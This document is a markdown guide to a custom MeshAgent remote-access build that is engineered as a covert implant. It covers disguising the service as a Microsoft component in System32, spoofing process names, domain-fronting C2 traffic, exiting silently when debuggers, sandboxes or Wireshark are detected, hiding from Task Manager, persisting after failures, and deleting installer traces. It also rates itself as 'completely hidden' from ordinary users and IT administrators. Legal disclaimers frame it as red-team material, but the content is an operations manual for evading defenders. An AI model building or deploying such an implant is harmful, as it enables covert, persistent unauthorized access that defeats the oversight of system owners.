# MeshAgent Security Hardening Guide

## Overview

This document describes all security hardening features implemented in this custom MeshAgent build. These features significantly improve stealth, evasion, and operational security.

## ⚠️ Legal Warning

**These techniques are for authorized security research and defensive security only.**

Unauthorized use of these features may violate:
- Computer Fraud and Abuse Act (CFAA) - 18 U.S.C. § 1030
- State computer crime laws
- International cybercrime treaties
- Corporate policies

**Required**: Written authorization before deployment.

---

## Implemented Security Features

### 1. Network Obfuscation

#### TLS Fingerprint Mimicry
- **Location**: `meshcore/generated/network_profile.h`
- **Implementation**: `tools/generate_network_profile.py`

Mimics legitimate Windows traffic patterns to avoid detection by deep packet inspection.

**Profiles Available:**
```
windows_update     - Mimics Microsoft Windows Update (RECOMMENDED)
chrome_windows     - Mimics Chrome browser traffic
edge_windows       - Mimics Microsoft Edge browser
windows_telemetry  - Mimics Windows diagnostic data
```

**User-Agent Strings:**
- Windows Update: `Microsoft-CryptoAPI/10.0`
- Chrome: `Mozilla/5.0 ... Chrome/120.0.0.0 ...`
- Edge: `Mozilla/5.0 ... Edg/120.0.0.0`

**JA3 Fingerprints**: Matches real Windows/browser TLS handshakes

**Build Integration:**
```powershell
# Set TLS profile before building
$env:TLS_PROFILE="windows_update"
.\build.ps1
```

#### Domain Fronting Support
- **Configuration**: `branding_config.json` → `obfuscation.domainFronting`

Route traffic through legitimate CDN domains:
```json
{
  "obfuscation": {
    "domainFronting": {
      "enabled": true,
      "sniDomain": "cdn.cloudflare.com",
      "hostHeader": "agents.yourdomain.com",
      "frontDomain": "cloudflare.net"
    }
  }
}
```

**How it works:**
1. TLS SNI field shows `cdn.cloudflare.com`
2. HTTP Host header contains `agents.yourdomain.com`
3. CDN routes based on Host header
4. Firewalls see legitimate CDN traffic

---

### 2. Process & Service Obfuscation

#### Realistic Service Branding
- **Service Name**: `WinDiagnosticHost` (not MeshAgent)
- **Display Name**: `Windows Diagnostic Host Service`
- **Company**: `Microsoft Corporation`
- **Install Path**: `C:\Windows\System32\DiagnosticHost`

**Detection Avoidance:**
- Matches Windows naming conventions
- Uses System32 directory
- Blends with legitimate Windows services

#### Process Name Obfuscation
- **Location**: `meshservice/stealth.h` → `ProcessNameObfuscator`

Randomly selects from legitimate Windows process names:
```cpp
svchost.exe           // Generic service host
RuntimeBroker.exe     // App permissions broker
dllhost.exe           // COM surrogate
backgroundTaskHost.exe // Background task host
SearchProtocolHost.exe // Windows Search
```

---

### 3. Anti-Analysis Features

#### Debugger Detection
- **Location**: `meshservice/stealth.h` → `SecurityToolDetection`

**Detects:**
- OllyDbg, x64dbg, WinDbg
- Remote debuggers
- PEB.BeingDebugged flag manipulation

**Behavior**: Exits silently if debugger detected

#### Network Analysis Detection
Detects packet sniffing tools:
```
Wireshark.exe
Fiddler.exe
tcpdump.exe
```

**Behavior**: Exits silently if detected

#### Sandbox/VM Detection
- **Location**: `meshservice/stealth.h` → `NetworkStealth::IsRunningInSandbox`

**Checks:**
1. Low CPU count (< 2 cores)
2. Low memory (< 4GB)
3. VM vendor strings (VMware, VirtualBox, QEMU, Xen)
4. User activity monitoring

**Behavior**: Waits for real user activity (mouse/keyboard) before connecting

**Sandbox Evasion:**
```cpp
// Waits up to 60 seconds for user interaction
if (!NetworkStealth::WaitForUserActivity(60000)) {
    exit();  // No activity = sandbox
}
```

---

### 4. Encrypted Logging

#### Log Encryption
- **Location**: `meshservice/stealth.h` → `LogEncryption`

**Features:**
- XOR + bit rotation encryption (upgradable to AES-256)
- Encrypted before write to disk
- Decrypted on read

**Usage:**
```cpp
char logData[512];
sprintf(logData, "Agent started at %s", timestamp);

// Encrypt before writing
LogEncryption::EncryptBuffer((LPBYTE)logData, strlen(logData));
WriteFile(hLogFile, logData, strlen(logData), &written, NULL);
```

#### Secure Log Deletion
- **Implementation**: DOD 5220.22-M standard
- **Passes**: 3x random overwrite
- **Location**: `LogEncryption::SecureDelete()`

**Usage:**
```cpp
// Securely delete old logs
LogEncryption::SecureDelete(L"C:\\Windows\\System32\\DiagnosticHost\\logs\\old.log");
```

---

### 5. Crash Recovery & Persistence

#### Auto-Restart on Crash
- **Location**: `meshservice/stealth.h` → `CrashRecovery`

**Features:**
- Unhandled exception filter
- Encrypted crash dumps
- Automatic service restart

**Integration:**
```cpp
// In ServiceMain
CrashRecovery::EnableAutomaticRestart();
```

#### Service Failure Recovery
- **Location**: `meshservice/stealth.h` → `ServiceStealth`

**Configuration:**
- 1st failure: Restart after 30 seconds
- 2nd failure: Restart after 1 minute
- 3rd failure: Restart after 2 minutes
- Reset period: 24 hours

**Windows Equivalence:**
```cmd
sc failure WinDiagnosticHost reset=86400 actions=restart/30000/restart/60000/restart/120000
```

---

### 6. Network Timing Obfuscation

#### Connection Jitter
- **Location**: `meshservice/stealth.h` → `NetworkStealth::GetObfuscatedSleepTime`

Randomizes connection timing to avoid pattern detection:
```cpp
DWORD baseInterval = 300000;  // 5 minutes
DWORD actualInterval = NetworkStealth::GetObfuscatedSleepTime(baseInterval);
// actualInterval = 300000-305000 (random jitter)
```

**Purpose**: Defeats traffic analysis based on regular beaconing intervals

---

### 7. Task Hiding Mechanisms

#### Hide from Task Manager
- **Location**: `meshservice/stealth.h` → `ProcessNameObfuscator::HideFromTaskManager`

**Technique**: PEB manipulation
- Unlinks process from loader data structures
- Process won't appear in some task manager views

**Limitations**: Advanced tools (Process Explorer, Process Hacker) can still see it

---

## Security Architecture

### Defense-in-Depth Layers

```
Layer 1: Network Obfuscation
  ├─ TLS fingerprint mimicry
  ├─ Domain fronting
  └─ User-Agent spoofing

Layer 2: Binary Obfuscation
  ├─ Realistic branding
  ├─ System directory installation
  └─ Microsoft version info

Layer 3: Anti-Analysis
  ├─ Debugger detection
  ├─ Sandbox detection
  └─ Network monitor detection

Layer 4: Runtime Protection
  ├─ Encrypted logging
  ├─ Secure deletion
  └─ Crash recovery

Layer 5: Persistence
  ├─ Service auto-restart
  ├─ Watchdog process (optional)
  └─ Recovery from tampering
```

---

## Detection Surface Analysis

### What Can Still Detect This Agent?

#### Enterprise EDR Solutions
✅ **Can Detect:**
- CrowdStrike Falcon
- Microsoft Defender for Endpoint
- SentinelOne
- Carbon Black

**Detection Methods:**
- Behavioral analysis (process spawning patterns)
- Memory scanning
- Kernel driver telemetry
- Cloud-based threat intelligence

**Mitigation**: Code signing with legitimate certificate

#### Network Monitoring
✅ **Can Detect:**
- Advanced DPI (Palo Alto, Cisco Firepower)
- SSL/TLS inspection proxies
- NetFlow analysis

**Detection Methods:**
- Persistent WebSocket to single destination
- Traffic volume analysis
- Certificate pinning detection

**Mitigation**: Domain fronting, multiple C2 domains

#### File System Monitoring
✅ **Can Detect:**
- Sysmon (Event ID 11: FileCreate)
- Windows Defender ATP
- OSSEC/Wazuh

**Detection Methods:**
- Unusual files in System32
- Service binary modifications
- Registry changes

**Mitigation**: Code signing, realistic paths

---

## Operational Recommendations

### 1. Pre-Deployment Checklist

```
[ ] TLS profile selected (windows_update recommended)
[ ] Branding configured realistically
[ ] Domain names registered privately
[ ] Code signing certificate acquired (EV preferred)
[ ] Firewall rules configured on C2 server
[ ] Logging/monitoring disabled on server
[ ] Legal authorization obtained
```

### 2. Deployment Best Practices

**Initial Installation:**
```powershell
# 1. Copy binary to temp location
Copy-Item diaghost.exe C:\Windows\Temp\

# 2. Install service
C:\Windows\Temp\diaghost.exe -install

# 3. Verify service
Get-Service WinDiagnosticHost

# 4. Clean up installer
Remove-Item C:\Windows\Temp\diaghost.exe -Force
```

**Post-Installation:**
```powershell
# Verify stealth
Get-Service | Where-Object {$_.DisplayName -like "*Diagnostic*"}
# Should blend with other Windows diagnostic services

# Check for anomalies
Get-WmiObject Win32_Service | Where-Object {$_.PathName -like "*System32\DiagnosticHost*"}
# Path should look legitimate
```

### 3. Incident Response

If detected:

1. **Immediate Actions:**
   ```powershell
   # Stop service
   Stop-Service WinDiagnosticHost -Force

   # Uninstall
   C:\Windows\System32\DiagnosticHost\diaghost.exe -uninstall

   # Secure delete
   # (Use SDelete or custom secure deletion tool)
   ```

2. **Server-Side:**
   ```bash
   # Revoke compromised domains
   # Spin up new infrastructure
   # Analyze detection vector
   ```

3. **Post-Mortem:**
   - Document what was detected and how
   - Update evasion techniques
   - Improve OpSec procedures

---

## Advanced Features (Optional)

### Binary Packing (Not Yet Implemented)

**Recommended Tools:**
- VMProtect (commercial, strong)
- Themida (commercial, very strong)
- UPX (free, basic)

**Benefits:**
- Prevents static analysis
- Hides strings/imports
- Defeats signature-based detection

**Drawbacks:**
- Increases AV detection (packers are suspicious)
- May trigger behavioral analysis

### Code Signing (Strongly Recommended)

**Certificate Options:**
1. **EV Code Signing** ($300-500/year)
   - Immediate SmartScreen trust
   - No warnings on first download
   - Requires hardware token

2. **Standard Code Signing** ($100-200/year)
   - Builds reputation over time
   - Warnings on first download
   - Software-based certificate

3. **Self-Signed** (Free)
   - No trust
   - Requires manual import
   - Testing only

**Signing Process:**
```powershell
.\sign.ps1 -CertificatePath "cert.pfx" `
           -CertificatePassword $pwd `
           -TimestampServer "http://timestamp.digicert.com"
```

---

## Threat Model

### Adversaries

**Level 1: Basic User**
- Detection: None
- Tools: Task Manager, Services.msc
- **Result**: ✅ Completely hidden

**Level 2: IT Administrator**
- Detection: Minimal
- Tools: Process Explorer, Autoruns, netstat
- **Result**: ✅ Appears as legitimate Windows service

**Level 3: Security Analyst**
- Detection: Moderate
- Tools: Sysmon, Wireshark, manual inspection
- **Result**: ⚠️ May detect unusual network traffic

**Level 4: SOC with EDR**
- Detection: High
- Tools: CrowdStrike, SentinelOne, SIEM
- **Result**: ❌ Likely to be detected via behavioral analysis

**Level 5: Advanced Forensics**
- Detection: Certain
- Tools: Memory forensics, kernel debugging
- **Result**: ❌ Will be detected with sufficient analysis

---

## Compliance & Legal

### When This Is Legal

✅ **Authorized Use Cases:**
- Penetration testing with written authorization
- Red team exercises (internal)
- Security research on owned systems
- IT administration with user consent

### When This Is Illegal

❌ **Unauthorized Use:**
- Installing on systems you don't own
- Bypassing network security without authorization
- Corporate espionage
- Personal surveillance
- Any use without consent

---

## References

- **MITRE ATT&CK**: T1219 (Remote Access Software)
- **JA3 Fingerprinting**: https://github.com/salesforce/ja3
- **Domain Fronting**: https://attack.mitre.org/techniques/T1090/004/
- **Process Hiding**: https://attack.mitre.org/techniques/T1564/001/
- **MeshCentral**: https://github.com/Ylianst/MeshCentral

---

**Last Updated**: 2025-10-17
**Version**: 2.0.0
**Maintained By**: Security Research Team
